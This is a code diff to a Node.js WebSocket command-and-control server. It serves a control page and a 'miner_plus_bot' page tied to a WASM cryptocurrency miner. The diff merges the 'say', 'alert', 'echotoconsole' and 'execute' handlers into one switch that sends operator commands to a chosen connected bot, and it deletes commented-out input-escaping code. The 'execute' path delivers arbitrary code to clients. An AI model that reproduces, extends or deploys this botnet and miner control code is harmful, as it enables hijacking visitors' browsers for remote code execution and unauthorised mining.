@@ -16,19 +16,13 @@ var history = [ ]; // latest 100 messages
 var clients = [ ]; // list of currently connected clients (users)
 
 app.use('/', serveIndex(__dirname + '/wasm'));
-app.use(express.static(__dirname + "/wasm"))
+app.use(express.static(__dirname + "/wasm"));
 
 app.listen(port, () => {
-    dateLog(`web server listening on port ${port}; check http:\/\/localhost:${port}/`)
+    dateLog(`web server listening on port ${port}; check http:\/\/localhost:${port}/`);
+    dateLog("Command and control page: http://localhost:"+port+"/commandandcontrol.html");
+    dateLog("Bot page: http://localhost:"+port+"/wasm-miner/local-miner/miner_plus_bot.html");
 })
-
-// helper function for escaping input strings
-/*
-function htmlEntities(str) {
-    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;')
-                      .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
-}
-*/
 
 function dateLog(str) {
     console.log((new Date()) + " " + str);
@@ -84,7 +78,6 @@ wsServer.on('request', function(request) {
         dateLog('Received message from '+ index + ': ' + message.utf8Data);
                 
         // keep history of all sent messages
-        //message = htmlEntities(message.utf8Data);
         message = message.utf8Data;
         var msgObj = logMessage(index, message);
 
@@ -103,7 +96,6 @@ wsServer.on('request', function(request) {
         var text = msgObj.text;
         var command = text.split(" ");
         var argCount = command.length-1;
-        //dateLog("argcount: "+argCount);
 
         if (argCount == 0) {
             sendCommandHelp(index);
@@ -120,31 +112,26 @@ wsServer.on('request', function(request) {
 
         if (argCount >= 3) {
             var target = command[1];
+            var fullcommand = text.substr(text.indexOf(command[2]));
             var message = text.substr(text.indexOf(command[3]));
 
+            var obj = {
+                time: (new Date()).getTime(),
+                text: fullcommand,
+                author: "cnc",
+            };
+            
+            switch (command[2]) {
+                case 'say':
+                case 'echotoconsole':
+                case 'alert':
+                case 'execute':
+                    dateLog("Directing "+target+" to "+fullcommand);
+                    singlecastCommand(obj, target);
+                    return;
+                default:
+                    return;
 
-            if (command[2] === 'say') {
-                dateLog("Directing "+target+" to say "+message);
-                sendSay(target, message);
-                return;
-            }
-
-            if (command[2] === 'echotoconsole') {
-                dateLog("Directing "+target+" to echo "+message);
-                sendEchoToConsole(target, message);
-                return;
-            }
-
-            if (command[2] === 'alert') {
-                dateLog("Directing "+target+" to alert "+message);
-                sendAlert(target, message);
-                return;
-            }
-
-            if (command[2] === 'execute') {
-                dateLog("Directing "+target+" to execute "+message);
-                sendExecute(target, message);
-                return;
             }
         }
     }
@@ -153,64 +140,11 @@ wsServer.on('request', function(request) {
         return msgText.split(" ", 1)
     }
 
-    function sendSay(destination_index, message) {
-        var data = "say "+message;
-
-        var obj = {
-            time: (new Date()).getTime(),
-            //text: htmlEntities(data),
-            text: data,
-            author: "cnc",
-        };
-
-        singlecastCommand(obj, destination_index);
-    }
-
-    function sendExecute(destination_index, message) {
-        var data = "execute "+message;
-
-        var obj = {
-            time: (new Date()).getTime(),
-            //text: htmlEntities(data),
-            text: data,
-            author: "cnc",
-        };
-
-        singlecastCommand(obj, destination_index);
-    }
-
-    function sendAlert(destination_index, message) {
-        var data = "alert "+message;
-
-        var obj = {
-            time: (new Date()).getTime(),
-            //text: htmlEntities(data),
-            text: data,
-            author: "cnc",
-        };
-
-        singlecastCommand(obj, destination_index);
-    }
-
-    function sendEchoToConsole(destination_index, message) {
-        var data = "echotoconsole "+message;
-
-        var obj = {
-            time: (new Date()).getTime(),
-            //text: htmlEntities(data),
-            text: data,
-            author: "cnc",
-        };
-
-        singlecastCommand(obj, destination_index);
-    }
-
     function sendSayHi(destination_index) {
         var data = "sayhi";
 
         var obj = {
             time: (new Date()).getTime(),
-            //text: htmlEntities(data),
             text: data,
             author: "cnc",
         };
@@ -227,7 +161,6 @@ wsServer.on('request', function(request) {
 
         var obj = {
             time: (new Date()).getTime(),
-            //text: htmlEntities(data),
             text: data,
             author: "cnc",
         };
